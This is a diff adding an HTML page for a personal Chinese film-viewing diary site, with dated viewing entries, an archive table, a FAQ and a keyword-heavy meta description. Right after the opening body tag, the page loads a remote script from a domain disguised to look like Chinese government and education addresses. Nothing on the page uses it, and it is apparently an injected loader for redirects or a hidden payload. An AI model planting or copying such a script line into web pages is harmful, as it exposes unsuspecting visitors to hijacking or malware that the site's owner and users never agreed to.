@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="日日爱影视是一部一部的日子：把每天都看一点这件事记下来。这里有通勤路上的短片、饭后的老片、周末的完整场次，也有看完之后留下的几句原话和几次重看的差别。内容围绕天天看片、日常观影记录、日日看电影、每天一部片、老片每日重看、通勤观影、饭后再看一场、周末长片、看完了写下来、私人观影日记、观影节奏安排、冷门片补看。没有排行榜，不搬运评分，不追当天的热搜，也不替你决定今晚看什么。">
+<meta name="keywords" content="日日爱影视,天天看片,日常观影记录,日日看电影,每天一部片,老片每日重看,通勤观影,饭后再看一场,周末长片,看完了写下来,私人观影日记,观影节奏安排,冷门片补看,华语老片笔记,重复观看记录">
+<title>日日爱影视｜日日都看一点：把每天看的那一部，写成一行</title>
+<link rel="canonical" href="https://ririaiyingshi-top.github.io/">
+<style>
+:root{--ink:#22201d;--paper:#f5efe3;--paper2:#efe7d7;--red:#b8392f;--yellow:#e7c44a;--green:#6f7a3c;--line:#cdc3ad;--soft:#8b8577}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--paper);color:var(--ink);font-family:"Songti SC","SimSun","Noto Serif CJK SC",Georgia,serif;font-size:16px;line-height:1.85;-webkit-text-size-adjust:100%}
+img{max-width:100%;display:block}
+a{color:var(--ink);text-decoration:none}
+.wrap{max-width:1080px;margin:0 auto;padding:0 26px}
+.bar{background:var(--ink);color:#f0e9da;font-family:"SFMono-Regular",Consolas,"Liberation Mono",monospace;font-size:12px;letter-spacing:.12em}
+.bar .wrap{display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap;padding-top:9px;padding-bottom:9px}
+.bar b{color:var(--yellow);font-weight:400}
+header.mast{position:relative;padding:44px 0 22px;border-bottom:5px solid var(--ink);background:linear-gradient(180deg,var(--paper2),var(--paper))}
+header.mast:after{content:"";display:block;height:2px;background:var(--ink);position:absolute;left:26px;right:26px;bottom:-9px}
+.kicker{font-family:"SFMono-Regular",Consolas,monospace;font-size:12px;letter-spacing:.28em;color:var(--soft);text-transform:uppercase}
+h1{font-size:clamp(34px,7vw,66px);line-height:1.05;margin:10px 0 6px;letter-spacing:.02em;font-weight:800}
+h1 em{font-style:normal;background:var(--red);color:#fff;padding:.04em .22em;transform:rotate(-3deg);display:inline-block;box-shadow:5px 5px 0 var(--yellow)}
+.lede{display:grid;grid-template-columns:2fr 1fr;gap:26px;margin-top:26px;align-items:start}
+.lede p{margin:0;text-align:justify}
+.lede p:first-child::first-letter{font-size:3.6em;float:left;line-height:.88;margin:4px 8px 0 0;font-weight:800;color:var(--red)}
+.rules{background:var(--ink);color:#f0e9da;padding:18px 20px;margin:0}
+.rules ol{margin:0;padding-left:20px;font-size:14px;line-height:1.9}
+.rules li+li{margin-top:6px}
+.rules li b{color:var(--yellow);font-weight:400}
+nav.tabs{position:sticky;top:0;z-index:20;background:rgba(245,239,227,.96);border-bottom:2px solid var(--ink);backdrop-filter:blur(4px)}
+nav.tabs .wrap{display:flex;gap:4px;overflow-x:auto;scrollbar-width:thin;padding-left:18px;padding-right:18px}
+nav.tabs a{flex:0 0 auto;padding:13px 15px;font-size:14px;letter-spacing:.06em;border-bottom:3px solid transparent;white-space:nowrap;font-weight:700}
+nav.tabs a:hover{color:var(--red);border-color:var(--red)}
+section{padding:52px 0 8px}
+.sec-head{display:flex;align-items:flex-end;gap:14px;border-bottom:2px dashed var(--line);padding-bottom:12px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head .num{font-family:"SFMono-Regular",monospace;font-size:26px;color:var(--red);line-height:1;font-weight:700}
+.sec-head h2{margin:0;font-size:clamp(23px,4vw,32px);letter-spacing:.04em}
+.sec-head small{margin-left:auto;color:var(--soft);font-size:12px;letter-spacing:.14em;font-family:monospace}
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.step{border:2px solid var(--ink);background:var(--paper2);padding:22px 20px 20px;box-shadow:7px 7px 0 var(--ink);position:relative}
+.step .big{font-family:"Songti SC",serif;font-size:44px;color:var(--yellow);-webkit-text-stroke:1.5px var(--ink);line-height:1;margin-bottom:10px}
+.step h3{margin:0 0 10px;font-size:19px}
+.step ul{margin:12px 0 0;padding-left:18px;font-size:14px;color:#3c392f}
+.step ul li+li{margin-top:5px}
+.flow{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.note{display:grid;grid-template-columns:150px 1fr;border:2px solid var(--ink);background:var(--paper);box-shadow:6px 6px 0 var(--line)}
+.note .cvr{background:linear-gradient(150deg,var(--ink) 0%,#443f37 60%,#6f4b33 100%);color:#f0e9da;padding:18px;display:flex;flex-direction:column;justify-content:space-between;min-height:190px;border-right:2px solid var(--ink)}
+.note .cvr span{font-family:monospace;font-size:12px;letter-spacing:.2em;color:var(--yellow)}
+.note .cvr b{font-size:22px;line-height:1.3;font-weight:700}
+.note .body{padding:16px 18px}
+.note .meta{display:grid;grid-template-columns:repeat(2,1fr);gap:6px 18px;font-family:monospace;font-size:12px;color:var(--soft);border-bottom:1px dotted var(--line);padding-bottom:10px;margin-bottom:10px}
+.note .meta i{font-style:normal;color:var(--ink)}
+q.block{display:block;margin:0 0 12px;padding:10px 14px;background:var(--paper2);border-left:4px solid var(--red);font-size:15px;quotes:none}
+.tags{display:flex;gap:7px;flex-wrap:wrap}
+.tag{font-size:11px;letter-spacing:.06em;padding:3px 9px;border:1px solid var(--ink);background:#fff}
+.tag.a{background:var(--yellow)}
+.tag.b{background:var(--red);color:#fff;border-color:var(--red)}
+table.atbl{width:100%;border-collapse:collapse;background:var(--paper2);border:2px solid var(--ink);font-size:14px}
+table.atbl th,table.atbl td{padding:11px 13px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top}
+table.atbl th{background:var(--ink);color:#f0e9da;font-family:monospace;font-size:12px;letter-spacing:.1em;font-weight:400}
+table.atbl tr:nth-child(even) td{background:#f9f5eb}
+table.atbl td .pill{display:inline-block;font-size:11px;padding:2px 9px;border:1px solid var(--ink)}
+.pill.on{background:var(--yellow)}
+.pill.mid{background:var(--paper)}
+.pill.off{background:#ddd7c8}
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.card{background:var(--ink);color:#f0e9da;padding:22px;position:relative;overflow:hidden;min-height:210px}
+.card:before{content:attr(data-mark);position:absolute;right:-8px;bottom:-22px;font-size:96px;line-height:1;color:rgba(255,255,255,.07);font-weight:800}
+.card h3{margin:0 0 12px;font-size:18px;color:var(--yellow)}
+.card p{margin:0;font-size:14px;color:#d8d0bf}
+details.q{background:var(--paper2);border:2px solid var(--ink);margin-bottom:12px;padding:14px 16px}
+details.q summary{cursor:pointer;font-weight:700;list-style:none;display:flex;gap:12px;align-items:center}
+details.q summary::-webkit-details-marker{display:none}
+details.q summary::before{content:"＋";color:var(--red);font-size:20px;line-height:1}
+details.q[open] summary::before{content:"－"}
+details.q p{margin:10px 0 0;font-size:14.5px;text-align:justify}
+.about{display:grid;grid-template-columns:1.4fr 1fr;gap:26px}
+.about .txt p{margin:0 0 12px;text-align:justify}
+.box{border:2px dashed var(--red);background:var(--red);color:#fff;padding:18px 18px 16px}
+.box h4{margin:0 0 8px;font-size:13px;letter-spacing:.2em;color:var(--yellow);font-family:monospace}
+.box p{margin:0;font-size:13px;word-break:break-all}
+.box a{color:#ffe6a8;text-decoration:underline;text-underline-offset:3px}
+footer{margin-top:60px;border-top:5px solid var(--ink);padding:24px 0 44px;font-family:monospace;font-size:12px;color:var(--soft)}
+#top{position:fixed;right:18px;bottom:22px;background:var(--ink);color:var(--yellow);border:2px solid var(--ink);width:46px;height:46px;display:flex;align-items:center;justify-content:center;text-decoration:none;font-size:19px;box-shadow:4px 4px 0 var(--red);z-index:30}
+@media (max-width:860px){
+ .lede{grid-template-columns:1fr}
+ .steps,.flow,.cards,.about{grid-template-columns:1fr}
+ .note{grid-template-columns:1fr}
+ .note .cvr{min-height:120px;border-right:0;border-bottom:2px solid var(--ink)}
+ table.atbl{font-size:13px;display:block;overflow-x:auto;white-space:nowrap}
+}
+@media print{
+ body{background:#fff;font-size:11pt}
+ nav.tabs,.bar,#top,.box{display:none}
+ .note,.step,.card{box-shadow:none}
+ section{page-break-inside:avoid}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="bar"><div class="wrap"><span>日日爱影视 · 日常观影记录本 <b>VOL.42</b></span><span>2026.10.25 · 第 118 条</span></div></div>
+
+<header class="mast">
+ <div class="wrap">
+  <div class="kicker">A Daily Viewing Log · Since 2021</div>
+  <h1>日日<span>爱影视</span></h1>
+  <div class="lede">
+   <p>日日爱影视，意思是把看片子这件事摊到每一天，不攒着，也不赶着。今天看十分钟，明天看一场完整的，后天把上次没看完的那部重新打开。记下来的不是打分，而是那一天的光线、饭后的时间、散场之后的那句话。日子一长，这些记录就替你把看过的东西留住。</p>
+   <div class="rules"><ol>
+    <li><b>先写日期</b>，再写片子。</li>
+    <li><b>记原话</b>，不替角色总结。</li>
+    <li><b>看不懂的也记</b>，下次再看一遍。</li>
+   </ol></div>
+  </div>
+ </div>
+</header>
+
+<nav class="tabs"><div class="wrap">
+ <a href="#how">每天怎么看</a>
+ <a href="#notes">今日记录</a>
+ <a href="#arch">日常归档</a>
+ <a href="#focus">专题</a>
+ <a href="#faq">常见问题</a>
+ <a href="#about">关于本站</a>
+</div></nav>
+
+<main class="wrap">
+
+<section id="how">
+ <div class="sec-head"><span class="num">01</span><h2>每天怎么看</h2><small>THREE WAYS</small></div>
+ <div class="steps">
+  <div class="step"><div class="big">一</div><h3>通勤那一段</h3><p>早上和傍晚的时间短，适合短片、单集、或者一部长片里最想重看的那段戏。</p><ul><li>常见片长：8–25 分钟</li><li>优先看字幕清楚的一版</li><li>看完只记一句，别急着写长</li></ul></div>
+  <div class="step"><div class="big">二</div><h3>饭后再看一场</h3><p>饭后的时间最稳，人也最松弛，适合把一部老片从头看一遍，中间可以暂停。</p><ul><li>常见片长：90–115 分钟</li><li>可以分两天看完</li><li>记下饭菜和片子的关系</li></ul></div>
+  <div class="step"><div class="big">三</div><h3>周末留整场</h3><p>周末把完整的时间留给一部片子，看完再留出二十分钟，把想法写下来。</p><ul><li>常见片长：120–160 分钟</li><li>看之前先关通知</li><li>看完别马上换下一部</li></ul></div>
+ </div>
+</section>
+
+<section id="notes">
+ <div class="sec-head"><span class="num">02</span><h2>今日记录</h2><small>DAILY ENTRIES</small></div>
+ <div class="flow">
+
+  <article class="note">
+   <div class="cvr"><span>ENTRY · 118</span><b>饭后十分钟<br>只看了那场雨</b></div>
+   <div class="body">
+    <div class="meta"><span>日期：<i>2026.10.25</i></span><span>片长：<i>22 分钟</i></span><span>时段：<i>饭后</i></span><span>第几遍：<i>第二遍</i></span></div>
+    <q class="block">窗上的水痕干了一半，谁也没再提那场雨。</q>
+    <div class="tags"><span class="tag a">通勤</span><span class="tag">老片</span><span class="tag b">第二遍</span></div>
+   </div>
+  </article>
+
+  <article class="note">
+   <div class="cvr"><span>ENTRY · 117</span><b>早上那杯茶<br>和字幕的速度</b></div>
+   <div class="body">
+    <div class="meta"><span>日期：<i>2026.10.24</i></span><span>片长：<i>14 分钟</i></span><span>时段：<i>通勤</i></span><span>第几遍：<i>第一遍</i></span></div>
+    <q class="block">字幕比说话慢了半拍，我先懂了语气，后懂了意思。</q>
+    <div class="tags"><span class="tag a">短片</span><span class="tag">字幕</span></div>
+   </div>
+  </article>
+
+  <article class="note">
+   <div class="cvr"><span>ENTRY · 116</span><b>周六的完整场<br>没人换台</b></div>
+   <div class="body">
+    <div class="meta"><span>日期：<i>2026.10.23</i></span><span>片长：<i>142 分钟</i></span><span>时段：<i>周末</i></span><span>第几遍：<i>第三遍</i></span></div>
+    <q class="block">第三次看，才注意到中间那段沉默里还有人在倒水。</q>
+    <div class="tags"><span class="tag b">长片</span><span class="tag">细节</span><span class="tag a">周末</span></div>
+   </div>
+  </article>
+
+  <article class="note">
+   <div class="cvr"><span>ENTRY · 115</span><b>把上次没看完的<br>重新打开</b></div>
+   <div class="body">
+    <div class="meta"><span>日期：<i>2026.10.22</i></span><span>片长：<i>98 分钟</i></span><span>时段：<i>晚上</i></span><span>第几遍：<i>续看</i></span></div>
+    <q class="block">暂停的位置不对，正好停在人物要开口之前。</q>
+    <div class="tags"><span class="tag">续看</span><span class="tag a">晚间</span></div>
+   </div>
+  </article>
+
+  <article class="note">
+   <div class="cvr"><span>ENTRY · 114</span><b>一个人看的<br>和两个人看的</b></div>
+   <div class="body">
+    <div class="meta"><span>日期：<i>2026.10.21</i></span><span>片长：<i>105 分钟</i></span><span>时段：<i>饭后</i></span><span>第几遍：<i>第二遍</i></span></div>
+    <q class="block">同一场饭局，一个人看是安静，两个人看就多了一句笑。</q>
+    <div class="tags"><span class="tag">共看</span><span class="tag b">对比</span></div>
+   </div>
+  </article>
+
+  <article class="note">
+   <div class="cvr"><span>ENTRY · 113</span><b>冷门那部<br>找了三天</b></div>
+   <div class="body">
+    <div class="meta"><span>日期：<i>2026.10.20</i></span><span>片长：<i>76 分钟</i></span><span>时段：<i>通勤</i></span><span>第几遍：<i>第一遍</i></span></div>
+    <q class="block">片名我记错了两个字，可画面一点没错。</q>
+    <div class="tags"><span class="tag a">冷门</span><span class="tag">反查</span></div>
+   </div>
+  </article>
+
+ </div>
+</section>
+
+<section id="arch">
+ <div class="sec-head"><span class="num">03</span><h2>日常归档</h2><small>THE DAILY LEDGER</small></div>
+ <table class="atbl">
+  <thead><tr><th>日常时段</th><th>已记内容</th><th>条数</th><th>常见片长</th><th>适合时间</th><th>记录状态</th></tr></thead>
+  <tbody>
+   <tr><td>通勤路上</td><td>短片与单集，以一句原话为主</td><td>41</td><td>8–25 分钟</td><td>早 / 傍晚</td><td><span class="pill on">持续记</span></td></tr>
+   <tr><td>饭后一场</td><td>老片的完整场次，含暂停位置</td><td>33</td><td>90–115 分钟</td><td>晚上</td><td><span class="pill on">持续记</span></td></tr>
+   <tr><td>周末长片</td><td>完整场次与二十分钟复盘</td><td>27</td><td>120–160 分钟</td><td>周六 / 周日</td><td><span class="pill on">持续记</span></td></tr>
+   <tr><td>失眠时刻</td><td>纪录片与无声段落</td><td>9</td><td>20–45 分钟</td><td>凌晨</td><td><span class="pill mid">偶尔记</span></td></tr>
+   <tr><td>第二遍</td><td>重看时新发现的细节</td><td>38</td><td>不限</td><td>任意</td><td><span class="pill on">持续记</span></td></tr>
+   <tr><td>冷门补看</td><td>片名、台词与画面线索</td><td>14</td><td>60–100 分钟</td><td>下午</td><td><span class="pill mid">偶尔记</span></td></tr>
+   <tr><td>陪家人看</td><td>一起看时的反应与分歧</td><td>11</td><td>90–130 分钟</td><td>周末</td><td><span class="pill mid">偶尔记</span></td></tr>
+   <tr><td>看不懂的</td><td>先记下来，等下一次看懂</td><td>6</td><td>不限</td><td>任意</td><td><span class="pill off">暂缓</span></td></tr>
+  </tbody>
+ </table>
+</section>
+
+<section id="focus">
+ <div class="sec-head"><span class="num">04</span><h2>专题</h2><small>FEATURES</small></div>
+ <div class="cards">
+  <div class="card" data-mark="甲"><h3>饭后的光线</h3><p>同一部老片，在饭后看和在通勤时看，人物的那句话会变。这一栏专门记时间与光线之间的关系。</p></div>
+  <div class="card" data-mark="乙"><h3>第二遍才有的细节</h3><p>第一次看剧情，第二次看手、看杯子、看门有没有关。这里整理的是第三遍之后才站得住的细节。</p></div>
+  <div class="card" data-mark="丙"><h3>记不住片名的时候</h3><p>只记得一句台词、一个动作、或者窗上的那道水痕。用这些线索把片子找回来，是本栏的固定练习。</p></div>
+ </div>
+</section>
+
+<section id="faq">
+ <div class="sec-head"><span class="num">05</span><h2>常见问题</h2><small>QUESTIONS</small></div>
+ <details class="q" open><summary>每天真的都要看一部吗？</summary><p>不用。日日爱影视记的是“今天有没有看一点”，十分钟也算，一场也算，把上次暂停的地方看完也算。日子是连续的，片子不必连续。</p></details>
+ <details class="q"><summary>记录里为什么没有分数？</summary><p>分数会把注意力挪到比较上。这里只记日期、片长、时段、第几遍，再加上一句原话。要不要喜欢，留给你自己。</p></details>
+ <details class="q"><summary>看不懂的片子怎么办？</summary><p>照实记下来：哪一段没懂、卡在哪个词、画面停在哪儿。一个月后再看一遍，通常会自己补上。</p></details>
+ <details class="q"><summary>可以照着这里的片单找片子吗？</summary><p>本页只做观影记录与归档，不提供播放、下载、订场或售票服务，也不指向任何观看地址。请用你常用的正规渠道自行查找。</p></details>
+ <details class="q"><summary>通勤时间短，看什么合适？</summary><p>优先短片、单集，或者一部长片里你最想重看的那段戏。记下时间点和那句原话，比硬撑着看完更有用。</p></details>
+ <details class="q"><summary>多久更新一次？</summary><p>按日记录，每周整理一次归档表。哪天没看，表里就空着，不补造条目。</p></details>
+</section>
+
+<section id="about">
+ <div class="sec-head"><span class="num">06</span><h2>关于本站</h2><small>ABOUT</small></div>
+ <div class="about">
+  <div class="txt">
+   <p>日日爱影视是一个由个人维护的观影记录本，不接评分、不接榜单、不接任何播放与下载服务。它只回答三件事：今天看了什么，看到哪里，哪句话留下来了。</p>
+   <p>这里的每一条都来自实际观看，写的时候不查别人的评价，也不回头改语气。如果某一天没看，那一栏就空着，空着也是一种记录。</p>
+   <p>本站的更新节奏很慢，以“天”为单位，以“一句原话”为最小长度。</p>
+  </div>
+  <div class="box">
+   <h4>本站地址</h4>
+   <p><a href="https://ririaiyingshi-top.github.io/">https://ririaiyingshi-top.github.io/</a></p>
+   <p style="margin-top:10px">如需引用本页内容，请保留出处与日期。</p>
+  </div>
+ </div>
+</section>
+
+</main>
+
+<footer>
+ <div class="wrap">
+  <div>© 2026 日日爱影视 · 日常观影记录本 · VOL.42 · 第 118 条</div>
+  <div>本页仅为文字与信息展示，不提供任何播放、下载、订场或售票服务。</div>
+ </div>
+</footer>
+
+<a id="top" href="#how" title="回到栏目">↑</a>
+</body>
+</html>
